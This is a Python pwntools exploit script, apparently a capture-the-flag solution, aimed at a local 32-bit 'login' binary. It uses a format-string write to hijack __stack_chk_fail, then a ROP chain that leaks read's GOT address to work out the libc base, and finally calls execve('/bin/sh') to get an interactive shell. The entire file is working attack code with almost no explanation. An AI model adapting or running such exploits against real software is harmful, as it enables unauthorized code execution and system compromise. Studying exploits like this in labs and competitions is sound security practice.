#coding=utf8

from pwn import *
#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

cn = process('./login')
bin = ELF('./login')
libc = ELF('./libc.so')

def z():
	gdb.attach(cn)
	raw_input()


pebp_ret = 0x0804871f
p3ret = 0x08048919
leave_ret = 0x08048598
read_buf = 0x0804862B



info('hijack __stack_chk_fail -> malloc.plt')
name=''
name+=p32(bin.got['__stack_chk_fail'])#%9$hhn arg
name+='A'*72+'bbbb'#ebp
name+=p32(bin.symbols['main'])#ret addr
name+='C'*36

name+=r'aaaa%38c%9$hhn\x00'#fmt hijack __stack_chk_fail -> malloc.plt

pwd = 'pwd'
cn.recvuntil('username')
cn.sendline(name)
cn.recvuntil('password')
#z()#b*0x08048751

cn.sendline(pwd)



info('use ROP to leak read.got and write ROP code to bss(sprintf遇到0字节会截断)')
name=''
name+='A'*76+'BBBB'
name+=p32(bin.plt['puts']) + p32(pebp_ret) + p32(bin.got['read'])
name+=p32(read_buf)+ p32(p3ret) +p32(bin.bss()+0x120)+p32(0x01010101)+p32(0xeeeeeeff)
name+=p32(pebp_ret) + p32(bin.bss()+0x120)
name+=p32(leave_ret)

cn.recvuntil('username')
cn.sendline(name)
cn.recvuntil('password')
#z()
cn.sendline(pwd)

cn.recvuntil(p32(leave_ret))
cn.recvuntil('\n')

read_addr = u32(cn.recv(4))
libc_base = read_addr-libc.symbols['read']
execve_addr = libc_base+libc.symbols['execve']
success('read_addr: '+hex(read_addr))
success('libc_base: '+hex(libc_base))
success('execve_addr: '+hex(execve_addr))


info('execve /bin/sh')
pay = ''
pay+='bbbb'+p32(execve_addr)+p32(p3ret)+p32(bin.bss()+0x120+24)+p32(0)+p32(0)
pay+='/bin/sh\x00'
pay+=chr(0xff)
cn.sendline(pay)
cn.recv()


info('get shell :)')
cn.interactive()
